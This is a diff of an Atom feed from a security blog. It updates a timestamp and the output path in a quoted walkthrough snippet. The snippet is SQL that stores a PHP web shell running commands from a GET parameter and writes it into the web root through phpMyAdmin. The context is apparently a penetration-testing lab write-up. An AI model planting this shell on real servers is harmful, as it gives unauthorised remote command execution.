@@ -4,7 +4,7 @@
   <title><![CDATA[Category: phpmyadmin | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/phpmyadmin/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-08-12T13:04:45-05:00</updated>
+  <updated>2016-08-12T13:07:52-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -176,7 +176,7 @@ msf auxiliary(joomla_plugins) &gt; run
 <pre><code>create database pwn;
 create table backdoor(script text);
 insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
-select * into outfile "/var/www/shells.php" from backdoor;
+select * into outfile "/var/www/backdoor3.php" from backdoor;
 </code></pre>
 
 <p>check the backdoor.</p>
